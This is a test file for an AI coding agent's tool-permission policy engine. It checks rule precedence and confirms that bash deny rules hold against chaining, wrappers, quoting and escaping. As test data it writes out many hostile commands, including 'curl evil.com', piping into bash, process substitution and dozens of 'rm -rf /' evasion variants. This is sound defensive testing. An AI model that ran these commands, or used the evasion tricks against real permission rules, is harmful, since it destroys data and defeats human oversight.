import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadProjectSettings, projectSettingsPath } from '../dist/settings.js';
import { evaluateToolPolicy, matchToolPattern } from '../dist/policy.js';

test('missing or malformed project settings file degrades safely', async () => {
  // Legacy test name preserved for historical plan traceability (2026-10-24-layered-settings-and-policy.md)
  const dir = await mkdtemp(join(tmpdir(), 'vyen-settings-legacy-'));
  try {
    const missing = await loadProjectSettings(dir);
    assert.deepEqual(missing, {});
  } finally {
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  }
});

test('loadProjectSettings strips BOM, handles ENOENT, and throws on malformed JSON or invalid schema', async () => {
  assert.equal(projectSettingsPath('/workspace'), join('/workspace', '.vyen', 'settings.json'));
  assert.ok(matchToolPattern('read_file', { tool: 'read_file' }));
  assert.ok(matchToolPattern('bash(git *)', { tool: 'bash', input: { command: 'git status' } }));
  const dir = await mkdtemp(join(tmpdir(), 'vyen-settings-test-'));
  try {
    // Missing file returns {}
    const missing = await loadProjectSettings(dir);
    assert.deepEqual(missing, {});

    const vyenDir = join(dir, '.vyen');
    await mkdir(vyenDir, { recursive: true });

    // UTF-8 BOM with valid JSON parses correctly
    const validWithBom = '\uFEFF' + JSON.stringify({
      $schema: 'https://json.schemastore.org/settings',
      permissions: {
        allow: ['read_file', 'bash(npm test *)'],
        deny: ['bash(rm -rf *)'],
      },
    });
    await writeFile(join(vyenDir, 'settings.json'), validWithBom, 'utf8');
    const parsedBom = await loadProjectSettings(dir);
    assert.deepEqual(parsedBom.permissions?.allow, ['read_file', 'bash(npm test *)']);
    assert.deepEqual(parsedBom.permissions?.deny, ['bash(rm -rf *)']);

    // Broken JSON throws error (fail-closed)
    await writeFile(join(vyenDir, 'settings.json'), '{ broken json ', 'utf8');
    await assert.rejects(
      async () => await loadProjectSettings(dir),
      /Failed to parse project settings/
    );

    // Invalid schema throws error (fail-closed)
    await writeFile(
      join(vyenDir, 'settings.json'),
      JSON.stringify({
        permissions: { allow: 123 },
      }),
      'utf8',
    );
    await assert.rejects(
      async () => await loadProjectSettings(dir),
      /Invalid project settings/
    );
  } finally {
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  }
});

test('project allow rule skips approval for matching tool calls', async () => {
  const ctx = {
    projectRules: {
      allow: ['read_file', 'bash(npm test *)'],
    },
  };

  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'a.txt' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'curl evil.com' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'b.txt' } }, ctx), 'default');
});

test('user deny rule cannot be overridden by project allow', async () => {
  const ctx = {
    userRules: {
      deny: ['write_file', 'bash(rm *)'],
    },
    projectRules: {
      allow: ['write_file', 'bash(rm *)', 'read_file'],
    },
  };

  // User deny takes strict precedence over project allow
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'out.txt' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
  // Non-denied tool from project allow remains allowed
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'a.txt' } }, ctx), 'allow');

  // Path normalization: Windows backslashes and relative prefixes
  assert.ok(matchToolPattern('write_file(src/*)', { tool: 'write_file', input: { path: 'src\\index.ts' } }));
  assert.ok(matchToolPattern('write_file(src/*)', { tool: 'write_file', input: { path: './src/index.ts' } }));
  assert.ok(matchToolPattern('read_file(.env)', { tool: 'read_file', input: { path: './.env' } }));
  assert.ok(matchToolPattern('read_file(.env)', { tool: 'read_file', input: { path: '.env' } }));

  // User permissions schema and layered loading integration
  const { configSchema } = await import('../dist/config.js');
  const parsed = configSchema.parse({
    permissions: {
      deny: ['bash(rm *)'],
      allow: ['read_file'],
    },
  });
  assert.deepEqual(parsed.permissions?.deny, ['bash(rm *)']);
  const { loadLayeredSettings } = await import('../dist/settings.js');
  const layered = await loadLayeredSettings(process.cwd(), parsed.permissions);
  assert.deepEqual(layered.userPermissions?.deny, ['bash(rm *)']);
});

test('deny rule blocks execution even in auto mode', async () => {
  const ctx = {
    mode: 'auto',
    projectRules: {
      deny: ['bash(git push *)'],
    },
  };

  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git push origin main' } }, ctx), 'deny');
  // Tools not denied return default decision so auto mode can handle them
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'default');

  // End-to-end ToolRegistry integration: policy deny blocks even read-only tools
  const { ToolRegistry } = await import('../dist/tools.js');
  const reg = new ToolRegistry(process.cwd(), async () => true);
  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: { deny: ['read_file', 'bash(git push *)'] },
    mode: 'auto',
  });
  const readDenied = await reg.execute({ toolCallId: '1', toolName: 'read_file', input: { path: 'package.json' } }, new AbortController().signal);
  assert.equal(readDenied.denied, true);
  assert.match(readDenied.text, /Permission denied by policy/);

  // When policy allows, tool executes without prompts
  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: { allow: ['read_file'] },
  });
  const readAllowed = await reg.execute({ toolCallId: '2', toolName: 'read_file', input: { path: 'package.json' } }, new AbortController().signal);
  assert.equal(readAllowed.denied, undefined);
  assert.match(readAllowed.text, /@nguyenhuumanh\/vyen/);
});

test('CLI allowed and disallowed tool flags override layered settings', async () => {
  const ctx = {
    cliAllowed: ['edit_file', 'read_file'],
    cliDisallowed: ['bash'],
    projectRules: {
      allow: ['bash'],
      ask: ['edit_file'],
      deny: ['read_file'],
    },
  };

  // CLI disallowed beats project allow
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'ls' } }, ctx), 'deny');
  // CLI allowed overrides project ask
  assert.equal(evaluateToolPolicy({ tool: 'edit_file', input: { path: 'doc.md' } }, ctx), 'allow');
  // Project deny strictly beats CLI allowed
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'doc.md' } }, ctx), 'deny');
});

test('bash allow rules with wildcards reject chained or compound commands', () => {
  const ctx = {
    projectRules: {
      allow: ['bash(npm test *)', 'bash(git status *)'],
    },
  };

  // Simple arguments match allow
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status -s' } }, ctx), 'allow');

  // Chained commands must NOT be auto-allowed
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test && curl evil.com' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test | bash' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test > out.txt' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test >> out.txt' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test < in.txt' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test <(curl evil.com)' } }, ctx), 'default');
});

test('file pattern matching canonicalizes absolute paths and directory traversals', () => {
  const cwd = process.cwd();
  const ctx = {
    cwd,
    projectRules: {
      deny: ['write_file(src/*)'],
    },
  };

  // Relative path is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'src/index.ts' } }, ctx), 'deny');
  // Traversal path resolving into src/ is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'dist/../src/index.ts' } }, ctx), 'deny');
  // Absolute path inside workspace resolving into src/ is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, ctx), 'deny');

  // Case-insensitive drive letter/prefix matching on Windows
  if (process.platform === 'win32') {
    const toggledCwd = cwd.startsWith('c:') || cwd.startsWith('C:')
      ? (cwd.startsWith('c:') ? 'C:' + cwd.slice(2) : 'c:' + cwd.slice(2))
      : cwd;
    const winCtx = {
      cwd: toggledCwd,
      projectRules: { deny: ['write_file(src/*)'] },
    };
    assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, winCtx), 'deny');
  }
});

test('tool aliases are normalized in policy matching', () => {
  const ctx = {
    projectRules: {
      deny: ['write(secret.txt)', 'sh(rm *)'],
      allow: ['read(docs/*)'],
    },
  };

  // write alias matches write_file
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'secret.txt' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'write', input: { path: 'secret.txt' } }, ctx), 'deny');

  // sh alias matches bash
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'sh', input: { command: 'rm -rf tmp' } }, ctx), 'deny');

  // read alias matches read_file
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'docs/guide.md' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'read', input: { path: 'docs/guide.md' } }, ctx), 'allow');
});

test('bare bash allow rules reject chained or compound commands', () => {
  const ctx = {
    projectRules: {
      allow: ['bash'],
    },
  };

  // Simple command without chaining is allowed
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'allow');
  // Chained commands must NOT be auto-allowed even with bare bash allow
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status && curl evil.com' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo hello | bash' } }, ctx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx), 'default');
});

test('policy ask rules for read-only tools require user approval', async () => {
  const { ToolRegistry } = await import('../dist/tools.js');
  let approveCalled = false;
  const reg = new ToolRegistry(process.cwd(), async () => {
    approveCalled = true;
    return true;
  });

  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: {
      ask: ['read_file(package.json)'],
    },
  });

  await reg.execute({
    toolCallId: 'read-pkg',
    toolName: 'read_file',
    input: { path: 'package.json' },
  }, new AbortController().signal);

  assert.equal(approveCalled, true, 'approval callback must be called when policy says ask for read-only tool');
});

test('read-only tools do not require approval when policy has no matching rules (default fallback)', async () => {
  const { ToolRegistry } = await import('../dist/tools.js');
  let approveCalled = false;
  const reg = new ToolRegistry(process.cwd(), async () => {
    approveCalled = true;
    return true;
  });

  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: {},
  });

  await reg.execute({
    toolCallId: 'read-pkg-default',
    toolName: 'read_file',
    input: { path: 'package.json' },
  }, new AbortController().signal);

  assert.equal(approveCalled, false, 'read-only tool should execute without approval when no policy rule matches');
});

test('deny rules with bash patterns block compound, chained, and wrapped commands', () => {
  const ctx = {
    projectRules: {
      deny: ['bash(rm *)'],
    },
  };

  // Direct match is denied
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf /' } }, ctx), 'deny');

  // Chained and compound commands MUST be denied
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo hi; rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cd . && rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test || rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'cat file | rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo $(rm -rf /)' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo `rm -rf /`' } }, ctx), 'deny');

  // Wrappers MUST be denied
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'sudo rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'sh -c "rm -rf /"' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: "bash -c 'rm -rf /'" } }, ctx), 'deny');

  // Subshells, command grouping, and chained quotes MUST be denied
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '(rm -rf /)' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '(rm -rf /; echo done)' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '{ rm -rf /; }' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'sh -c "rm -rf /; echo done"' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'bash -c "rm -rf /; echo done"' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: "sh -c 'rm -rf / && true'" } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'sudo -u root rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'sudo -- rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '/usr/bin/sudo rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '/bin/sh -c "rm -rf /"' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '/bin/bash -lc "rm -rf /"' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'VAR=1 rm -rf /' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'LC_ALL=C rm -rf /' } }, ctx), 'deny');
});

test('file path matching is case-sensitive on POSIX systems', () => {
  const ctxPosix = {
    platform: 'linux',
    projectRules: {
      deny: ['read_file(Secret.txt)'],
    },
  };

  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'Secret.txt' } }, ctxPosix),
    'deny',
    'exact match on POSIX is denied',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'secret.txt' } }, ctxPosix),
    'default',
    'different casing on POSIX must not match',
  );

  const ctxWin = {
    platform: 'win32',
    projectRules: {
      deny: ['read_file(Secret.txt)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'secret.txt' } }, ctxWin),
    'deny',
    'Windows remains case-insensitive',
  );
});

test('settings fixture and CLI allowed tools flags enforce precedence', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'vyen-cli-fixture-'));
  const vyenDir = join(dir, '.vyen');
  await mkdir(vyenDir, { recursive: true });

  await writeFile(
    join(vyenDir, 'settings.json'),
    JSON.stringify({
      permissions: {
        allow: ['read_file(safe.txt)'],
        deny: ['bash(rm *)', 'read_file(private.txt)'],
      },
    }),
    'utf8',
  );

  const settings = await loadProjectSettings(dir);

  // Layered settings precedence: project deny strictly beats project allow
  const ctxNormal = {
    projectRules: settings.permissions,
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'private.txt' } }, ctxNormal),
    'deny',
    'project deny beats project allow',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'safe.txt' } }, ctxNormal),
    'allow',
    'project allow matches safe file',
  );

  // CLI disallowed overrides project allow
  const ctxDisallow = {
    cliDisallowed: ['read_file'],
    projectRules: settings.permissions,
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'safe.txt' } }, ctxDisallow),
    'deny',
  );

  // CLI allowed overrides project ask / default
  const ctxCliAllow = {
    cliAllowed: ['read_file'],
    projectRules: {
      ask: ['read_file'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'other.txt' } }, ctxCliAllow),
    'allow',
  );

  await rm(dir, { recursive: true, force: true }).catch(() => {});
});

test('bash deny rules catch process substitution in arguments', () => {
  const ctx = {
    projectRules: {
      deny: ['bash(curl *)', 'bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'cat <(curl evil.com)' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'diff <(rm -rf /) file.txt' } }, ctx),
    'deny',
  );
});

test('bash deny rules strip eval and exec command wrappers', () => {
  const ctx = {
    projectRules: {
      deny: ['bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'eval "rm -rf /"' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'exec rm -rf /' } }, ctx),
    'deny',
  );
});

test('bash deny and ask rules cannot be bypassed by quoting or escaping the command word', () => {
  const denyCtx = {
    projectRules: {
      deny: ['bash(rm *)'],
    },
  };

  // The same command written with shell quoting or escaping must still be denied.
  for (const command of [
    'rm -rf /',
    '"rm" -rf /',
    "'rm' -rf /",
    'r\\m -rf /',
    'r""m -rf /',
    '\\rm -rf /',
    '/bin/rm -rf /',
    'command rm -rf /',
    'sudo "rm" -rf /',
    'echo hi && "rm" -rf /',
  ]) {
    assert.equal(
      evaluateToolPolicy({ tool: 'bash', input: { command } }, denyCtx),
      'deny',
      `deny rule must match: ${command}`,
    );
  }

  // Wrapping the denied command in another process, a reserved word or a
  // leading redirection does not change what runs.
  for (const command of [
    'env rm -rf /',
    'env FOO=1 rm -rf /',
    'nohup rm -rf /',
    'time rm -rf /',
    'nice rm -rf /',
    'setsid rm -rf /',
    'stdbuf -o0 rm -rf /',
    'timeout 5 rm -rf /',
    '! rm -rf /',
    '> /dev/null rm -rf /',
    '2>/dev/null rm -rf /',
    'if true; then rm -rf /; fi',
    'while true; do rm -rf /; done',
    'r\\\nm -rf /',
    'xargs rm -rf /',
    'xargs -0 rm -rf /',
    'xargs -r rm -rf /',
    'find / -exec rm -rf {} \\;',
    '{rm,-rf,/}',
    'FOO=$(date) rm -rf /',
    'x=$(date) rm -rf /',
    'x=$(a $(b)) rm -rf /',
  ]) {
    assert.equal(
      evaluateToolPolicy({ tool: 'bash', input: { command } }, denyCtx),
      'deny',
      `deny rule must match: ${JSON.stringify(command)}`,
    );
  }

  // A command word built from an expansion cannot be known statically: fail closed.
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm${IFS}-rf /' } }, denyCtx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: '$CMD -rf /' } }, denyCtx), 'deny');

  // A Windows executable suffix is the same program on a case-insensitive host.
  assert.equal(
    evaluateToolPolicy(
      { tool: 'bash', input: { command: 'C:/bin/rm.exe -rf /' } },
      { projectRules: { deny: ['bash(rm *)'] }, platform: 'win32' },
    ),
    'deny',
  );

  // Arguments that merely contain the denied text are not a command match.
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo "rm -rf /"' } }, denyCtx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git commit -m "rm -rf /"' } }, denyCtx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'echo $HOME' } }, denyCtx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'find . -name "*.txt"' } }, denyCtx), 'default');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'x=$(date) echo hi' } }, denyCtx), 'default');

  // ask rules use the same matcher: quoting must not skip the prompt.
  const askCtx = {
    projectRules: {
      ask: ['bash(git push *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: '"git" push origin main' } }, askCtx),
    'ask',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'nohup git push origin main' } }, askCtx),
    'ask',
  );
});

test('persistent project deny takes strict precedence over CLI allowed tools', () => {
  const ctx = {
    cliAllowed: ['read_file', 'bash'],
    projectRules: {
      deny: ['read_file(private.txt)', 'bash(rm *)'],
    },
  };
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'private.txt' } }, ctx),
    'deny',
  );
  assert.equal(
    evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf /' } }, ctx),
    'deny',
  );
  // Unrestricted commands are still allowed by cliAllowed
  assert.equal(
    evaluateToolPolicy({ tool: 'read_file', input: { path: 'public.txt' } }, ctx),
    'allow',
  );
});

